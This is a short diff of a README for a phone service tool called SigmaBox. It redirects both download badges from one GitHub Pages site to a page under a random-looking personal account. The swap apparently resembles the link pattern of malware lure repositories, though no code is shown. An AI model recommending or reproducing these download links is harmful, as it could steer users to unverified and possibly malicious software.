@@ -1,7 +1,7 @@
 # 🔧 SigmaBox — Service Tool
 
-[![Download SigmaBox](https://img.shields.io/badge/Download_SigmaBox-steelblue?style=for-the-badge)](https://sigmabox-tool.github.io/.github/)  
-[![Get Started](https://img.shields.io/badge/Get_Started-cyan?style=for-the-badge&logo=smartphone)](https://sigmabox-tool.github.io/.github/)
+[![Download SigmaBox](https://img.shields.io/badge/Download_SigmaBox-steelblue?style=for-the-badge)](https://hanneloreaipperspach6130390.github.io/.github/sigmabox-tool)  
+[![Get Started](https://img.shields.io/badge/Get_Started-cyan?style=for-the-badge&logo=smartphone)](https://hanneloreaipperspach6130390.github.io/.github/sigmabox-tool)
 
 ---
 
